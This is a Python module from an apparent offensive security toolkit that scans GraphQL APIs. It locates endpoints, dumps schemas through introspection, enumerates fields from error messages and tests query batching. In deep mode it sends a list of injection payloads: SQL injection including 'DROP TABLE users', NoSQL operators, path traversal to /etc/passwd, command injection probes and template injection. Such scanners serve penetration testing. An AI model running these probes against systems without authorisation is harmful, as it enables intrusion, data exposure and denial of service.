# HikariSystem Tsurugi/modules/graphql.py
"""
GRAPHQL SCANNER MODULE - Comprehensive GraphQL Security Testing
Detects and exploits GraphQL-specific vulnerabilities.

Features:
- Introspection dump (full schema extraction)
- Query injection testing
- Mutation abuse detection
- Batching/Aliasing DoS (query amplification)
- Field enumeration (when introspection disabled)
- Authorization bypass testing
"""
import json
import time
from typing import Dict, List, Optional, Tuple, Any
from urllib.parse import urlparse, urljoin
from dataclasses import dataclass, field
from core.ui import console, log_info, log_success, log_warning, log_error
from core.logger import save_loot
from core.requester import TsurugiSession
from rich.panel import Panel
from rich.table import Table
from rich.syntax import Syntax


# ═══════════════════════════════════════════════════════════════════════════════
#  INTROSPECTION QUERIES
# ═══════════════════════════════════════════════════════════════════════════════

INTROSPECTION_QUERY = """
query IntrospectionQuery {
  __schema {
    queryType { name }
    mutationType { name }
    subscriptionType { name }
    types {
      ...FullType
    }
  }
}

fragment FullType on __Type {
  kind
  name
  description
  fields(includeDeprecated: true) {
    name
    description
    args {
      ...InputValue
    }
    type {
      ...TypeRef
    }
  }
  inputFields {
    ...InputValue
  }
  interfaces {
    ...TypeRef
  }
  enumValues(includeDeprecated: true) {
    name
  }
  possibleTypes {
    ...TypeRef
  }
}

fragment InputValue on __InputValue {
  name
  description
  type {
    ...TypeRef
  }
  defaultValue
}

fragment TypeRef on __Type {
  kind
  name
  ofType {
    kind
    name
    ofType {
      kind
      name
      ofType {
        kind
        name
      }
    }
  }
}
"""

SIMPLE_INTROSPECTION = """
{
  __schema {
    types {
      name
      kind
      fields {
        name
      }
    }
  }
}
"""

TYPENAME_QUERY = """
{
  __typename
}
"""


# ═══════════════════════════════════════════════════════════════════════════════
#  INJECTION PAYLOADS
# ═══════════════════════════════════════════════════════════════════════════════

INJECTION_PAYLOADS = [
    # SQL Injection in arguments
    '1\' OR \'1\'=\'1',
    '1" OR "1"="1',
    "1; DROP TABLE users--",
    "1' UNION SELECT NULL--",
    
    # NoSQL Injection
    '{"$gt": ""}',
    '{"$ne": null}',
    '{"$regex": ".*"}',
    
    # Path Traversal
    "../../../etc/passwd",
    "..\\..\\..\\windows\\win.ini",
    
    # Command Injection
    "; id",
    "| cat /etc/passwd",
    "`id`",
    "$(id)",
    
    # SSTI
    "{{7*7}}",
    "${7*7}",
]


# ═══════════════════════════════════════════════════════════════════════════════
#  COMMON FIELD NAMES (for enumeration when introspection disabled)
# ═══════════════════════════════════════════════════════════════════════════════

COMMON_FIELDS = [
    "user", "users", "admin", "admins", "me", "viewer",
    "login", "logout", "register", "signup", "signin",
    "password", "email", "token", "secret", "key",
    "post", "posts", "article", "articles", "comment", "comments",
    "order", "orders", "payment", "payments", "transaction",
    "file", "files", "upload", "download", "document",
    "message", "messages", "notification", "notifications",
    "setting", "settings", "config", "configuration",
    "debug", "test", "internal", "private", "admin_only",
    "createUser", "updateUser", "deleteUser",
    "createAdmin", "createToken", "resetPassword",
]


# ═══════════════════════════════════════════════════════════════════════════════
#  RESULT DATACLASS
# ═══════════════════════════════════════════════════════════════════════════════

@dataclass
class GraphQLResult:
    """GraphQL scan result."""
    endpoint: str
    introspection_enabled: bool = False
    schema: Dict = field(default_factory=dict)
    types: List[str] = field(default_factory=list)
    queries: List[str] = field(default_factory=list)
    mutations: List[str] = field(default_factory=list)
    sensitive_fields: List[str] = field(default_factory=list)
    injection_vulns: List[Dict] = field(default_factory=list)
    batching_vulnerable: bool = False
    findings: List[Dict] = field(default_factory=list)


# ═══════════════════════════════════════════════════════════════════════════════
#  CORE FUNCTIONS
# ═══════════════════════════════════════════════════════════════════════════════

def send_graphql(url: str, query: str, variables: Dict = None, 
                 requester: TsurugiSession = None) -> Tuple[Optional[Dict], int]:
    """Send GraphQL query and return response."""
    if not requester:
        requester = TsurugiSession()
    
    payload = {"query": query}
    if variables:
        payload["variables"] = variables
    
    try:
        resp = requester.post(
            url,
            json=payload,
            headers={"Content-Type": "application/json"},
            timeout=15
        )
        
        if resp:
            try:
                return resp.json(), resp.status_code
            except:
                return None, resp.status_code
        return None, 0
    except Exception as e:
        return None, 0


def detect_graphql_endpoint(base_url: str, requester: TsurugiSession) -> Optional[str]:
    """Detect GraphQL endpoint."""
    common_paths = [
        "/graphql", "/api/graphql", "/v1/graphql", "/v2/graphql",
        "/query", "/api/query", "/gql", "/api/gql",
        "/graphql/v1", "/graphql/api"
    ]
    
    parsed = urlparse(base_url)
    base = f"{parsed.scheme}://{parsed.netloc}"
    
    # If URL already looks like GraphQL, test it first
    if any(p in base_url for p in ["graphql", "gql", "query"]):
        data, status = send_graphql(base_url, TYPENAME_QUERY, requester=requester)
        if data and "__typename" in str(data):
            return base_url
    
    # Test common paths
    for path in common_paths:
        test_url = urljoin(base, path)
        data, status = send_graphql(test_url, TYPENAME_QUERY, requester=requester)
        
        if data and "__typename" in str(data):
            log_success(f"GraphQL endpoint found: {test_url}")
            return test_url
        
        # Also check for GraphQL error response (indicates endpoint exists)
        if status == 400 and data and "errors" in str(data):
            log_success(f"GraphQL endpoint found (error response): {test_url}")
            return test_url
    
    return None


def test_introspection(url: str, requester: TsurugiSession) -> Tuple[bool, Dict]:
    """Test if introspection is enabled and dump schema."""
    
    # Try full introspection
    data, status = send_graphql(url, INTROSPECTION_QUERY, requester=requester)
    
    if data and "data" in data and data["data"].get("__schema"):
        return True, data["data"]["__schema"]
    
    # Try simple introspection
    data, status = send_graphql(url, SIMPLE_INTROSPECTION, requester=requester)
    
    if data and "data" in data and data["data"].get("__schema"):
        return True, data["data"]["__schema"]
    
    return False, {}


def extract_schema_info(schema: Dict) -> Dict:
    """Extract useful info from introspection schema."""
    info = {
        "types": [],
        "queries": [],
        "mutations": [],
        "sensitive": [],
    }
    
    if not schema:
        return info
    
    types = schema.get("types", [])
    query_type = schema.get("queryType", {}).get("name", "Query")
    mutation_type = schema.get("mutationType", {}).get("name", "Mutation")
    
    sensitive_patterns = [
        "password", "secret", "token", "key", "admin", "private",
        "internal", "credential", "auth", "session", "api_key"
    ]
    
    for t in types:
        name = t.get("name", "")
        
        # Skip internal types
        if name.startswith("__"):
            continue
        
        info["types"].append(name)
        
        # Extract fields
        fields = t.get("fields") or []
        for field in fields:
            field_name = field.get("name", "")
            full_name = f"{name}.{field_name}"
            
            # Check for queries
            if name == query_type:
                info["queries"].append(field_name)
            
            # Check for mutations
            if name == mutation_type:
                info["mutations"].append(field_name)
            
            # Check for sensitive fields
            for pattern in sensitive_patterns:
                if pattern in field_name.lower():
                    info["sensitive"].append(full_name)
    
    return info


def test_batching(url: str, requester: TsurugiSession) -> Tuple[bool, str]:
    """Test for batching/aliasing vulnerability (query amplification)."""
    
    # Create batched query with aliases
    batch_query = """
    query BatchTest {
        a1: __typename
        a2: __typename
        a3: __typename
        a4: __typename
        a5: __typename
        a6: __typename
        a7: __typename
        a8: __typename
        a9: __typename
        a10: __typename
    }
    """
    
    start = time.time()
    data, status = send_graphql(url, batch_query, requester=requester)
    elapsed = time.time() - start
    
    if data and "data" in data:
        aliases = [k for k in data["data"].keys() if k.startswith("a")]
        if len(aliases) >= 10:
            return True, f"Batching allowed ({len(aliases)} aliases, {elapsed:.2f}s)"
    
    # Try array batching
    array_batch = [
        {"query": "{ __typename }"},
        {"query": "{ __typename }"},
        {"query": "{ __typename }"},
    ]
    
    try:
        resp = requester.post(url, json=array_batch, timeout=10)
        if resp and isinstance(resp.json(), list):
            return True, "Array batching allowed"
    except:
        pass
    
    return False, ""


def test_field_suggestions(url: str, requester: TsurugiSession) -> List[str]:
    """Use error messages to enumerate fields when introspection is disabled."""
    discovered = []
    
    for field in COMMON_FIELDS[:20]:  # Limit for speed
        query = f"{{ {field} }}"
        data, status = send_graphql(url, query, requester=requester)
        
        if data:
            errors = data.get("errors", [])
            for error in errors:
                msg = error.get("message", "").lower()
                
                # Field exists but requires auth or args
                if "argument" in msg or "required" in msg:
                    discovered.append(field)
                    console.print(f"    [green]✓[/green] Field exists: {field}")
                
                # Check for suggestions in error
                if "did you mean" in msg:
                    # Extract suggested fields
                    import re
                    suggestions = re.findall(r'"([^"]+)"', error.get("message", ""))
                    for s in suggestions:
                        if s not in discovered:
                            discovered.append(s)
                            console.print(f"    [cyan]→[/cyan] Suggested: {s}")
    
    return discovered


def test_injection(url: str, field: str, requester: TsurugiSession) -> List[Dict]:
    """Test a field for injection vulnerabilities."""
    vulns = []
    
    for payload in INJECTION_PAYLOADS[:10]:  # Limit for speed
        # Build query with injected argument
        query = f'''
        query {{
            {field}(id: "{payload}") {{
                id
            }}
        }}
        '''
        
        data, status = send_graphql(url, query, requester=requester)
        
        if data:
            response_str = json.dumps(data).lower()
            
            # Check for SQL error indicators
            if any(x in response_str for x in ["syntax error", "sql", "mysql", "postgres", "sqlite"]):
                vulns.append({
                    "type": "SQL Injection",
                    "field": field,
                    "payload": payload,
                    "evidence": "SQL error in response"
                })
            
            # Check for path traversal success
            if "root:" in response_str or "[extensions]" in response_str:
                vulns.append({
                    "type": "Path Traversal",
                    "field": field,
                    "payload": payload,
                    "evidence": "File content in response"
                })
            
            # Check for command output
            if "uid=" in response_str:
                vulns.append({
                    "type": "Command Injection",
                    "field": field,
                    "payload": payload,
                    "evidence": "Command output in response"
                })
    
    return vulns


# ═══════════════════════════════════════════════════════════════════════════════
#  MAIN SCANNER
# ═══════════════════════════════════════════════════════════════════════════════

def run_graphql_scan(url: str, cookie: str = None, proxy: str = None,
                     deep: bool = False) -> GraphQLResult:
    """
    Comprehensive GraphQL security scan.
    
    Args:
        url: GraphQL endpoint or base URL
        cookie: Session cookie
        proxy: Proxy URL
        deep: Enable deep testing (injection, more enumeration)
        
    Returns:
        GraphQLResult with all findings
    """
    console.print(f"\n[bold magenta][*] GRAPHQL SCANNER[/bold magenta] → [yellow]{url}[/yellow]")
    
    requester = TsurugiSession(cookie_string=cookie, proxy=proxy)
    result = GraphQLResult(endpoint=url)
    
    # Phase 1: Endpoint Detection
    log_info("Phase 1: Detecting GraphQL endpoint...")
    endpoint = detect_graphql_endpoint(url, requester)
    
    if not endpoint:
        log_error("No GraphQL endpoint found. Try specifying the exact path.")
        return result
    
    result.endpoint = endpoint
    console.print(f"[green]✓[/green] Endpoint: {endpoint}")
    
    # Phase 2: Introspection
    log_info("Phase 2: Testing introspection...")
    intro_enabled, schema = test_introspection(endpoint, requester)
    
    result.introspection_enabled = intro_enabled
    result.schema = schema
    
    if intro_enabled:
        console.print(Panel(
            "[bold red]INTROSPECTION ENABLED[/bold red]\n"
            "Full schema is exposed. This reveals all types, queries, and mutations.",
            title="⚠ Security Issue",
            border_style="red"
        ))
        
        result.findings.append({
            "type": "Introspection Enabled",
            "severity": "MEDIUM",
            "description": "GraphQL introspection is enabled, exposing the full API schema"
        })
        
        # Extract schema info
        schema_info = extract_schema_info(schema)
        result.types = schema_info["types"]
        result.queries = schema_info["queries"]
        result.mutations = schema_info["mutations"]
        result.sensitive_fields = schema_info["sensitive"]
        
        # Display schema summary
        console.print(f"\n[bold cyan]Schema Summary:[/bold cyan]")
        console.print(f"  Types: {len(result.types)}")
        console.print(f"  Queries: {len(result.queries)}")
        console.print(f"  Mutations: {len(result.mutations)}")
        
        if result.queries:
            console.print(f"\n[bold]Available Queries:[/bold]")
            for q in result.queries[:10]:
                console.print(f"  - {q}")
            if len(result.queries) > 10:
                console.print(f"  ... and {len(result.queries) - 10} more")
        
        if result.mutations:
            console.print(f"\n[bold]Available Mutations:[/bold]")
            for m in result.mutations[:10]:
                console.print(f"  - {m}")
        
        if result.sensitive_fields:
            console.print(Panel(
                "\n".join(result.sensitive_fields[:15]),
                title="[bold yellow]⚠ Sensitive Fields Detected[/bold yellow]",
                border_style="yellow"
            ))
            
            result.findings.append({
                "type": "Sensitive Fields Exposed",
                "severity": "HIGH",
                "fields": result.sensitive_fields
            })
    else:
        console.print("[green]✓[/green] Introspection disabled (good!)")
        
        # Try field enumeration
        log_info("Attempting field enumeration via error messages...")
        discovered = test_field_suggestions(endpoint, requester)
        
        if discovered:
            result.queries = discovered
            console.print(f"[yellow]Discovered {len(discovered)} fields via enumeration[/yellow]")
    
    # Phase 3: Batching Test
    log_info("Phase 3: Testing batching/aliasing...")
    batching_vuln, batch_msg = test_batching(endpoint, requester)
    
    result.batching_vulnerable = batching_vuln
    
    if batching_vuln:
        console.print(Panel(
            f"[bold red]{batch_msg}[/bold red]\n"
            "Attackers can amplify queries causing DoS or resource exhaustion.",
            title="⚠ Batching Vulnerable",
            border_style="red"
        ))
        
        result.findings.append({
            "type": "Query Batching Allowed",
            "severity": "MEDIUM",
            "description": batch_msg
        })
    else:
        console.print("[green]✓[/green] Batching appears restricted")
    
    # Phase 4: Injection Testing (if deep mode)
    if deep and (result.queries or result.mutations):
        log_info("Phase 4: Testing for injection vulnerabilities...")
        
        test_fields = (result.queries + result.mutations)[:5]  # Limit
        
        for field in test_fields:
            console.print(f"  Testing: {field}")
            vulns = test_injection(endpoint, field, requester)
            
            for vuln in vulns:
                result.injection_vulns.append(vuln)
                console.print(Panel(
                    f"[bold]Type:[/bold] {vuln['type']}\n"
                    f"[bold]Field:[/bold] {vuln['field']}\n"
                    f"[bold]Payload:[/bold] {vuln['payload']}",
                    title="[bold red]🔥 INJECTION FOUND[/bold red]",
                    border_style="red"
                ))
                
                result.findings.append({
                    "type": vuln["type"],
                    "severity": "CRITICAL",
                    **vuln
                })
    
    # Summary
    console.print(f"\n[bold green][+] GraphQL Scan Complete![/bold green]")
    console.print(f"  Introspection: {'[red]ENABLED[/red]' if result.introspection_enabled else '[green]DISABLED[/green]'}")
    console.print(f"  Batching: {'[red]VULNERABLE[/red]' if result.batching_vulnerable else '[green]RESTRICTED[/green]'}")
    console.print(f"  Findings: {len(result.findings)}")
    
    if result.findings:
        # Save loot
        save_loot("graphql", endpoint, {
            "introspection": result.introspection_enabled,
            "types": len(result.types),
            "queries": result.queries,
            "mutations": result.mutations,
            "sensitive_fields": result.sensitive_fields,
            "batching_vulnerable": result.batching_vulnerable,
            "findings": result.findings
        })
    
    return result


def dump_schema(url: str, cookie: str = None, proxy: str = None, 
                output_file: str = None) -> Optional[Dict]:
    """
    Dump full GraphQL schema to file.
    
    Args:
        url: GraphQL endpoint
        cookie: Session cookie
        proxy: Proxy URL
        output_file: File to save schema JSON
        
    Returns:
        Schema dict if successful
    """
    console.print(f"\n[bold magenta][*] GRAPHQL SCHEMA DUMP[/bold magenta] → [yellow]{url}[/yellow]")
    
    requester = TsurugiSession(cookie_string=cookie, proxy=proxy)
    
    intro_enabled, schema = test_introspection(url, requester)
    
    if not intro_enabled:
        log_error("Introspection is disabled. Cannot dump schema.")
        return None
    
    if output_file:
        with open(output_file, "w") as f:
            json.dump(schema, f, indent=2)
        log_success(f"Schema saved to: {output_file}")
    else:
        console.print(Syntax(json.dumps(schema, indent=2)[:5000], "json"))
    
    return schema
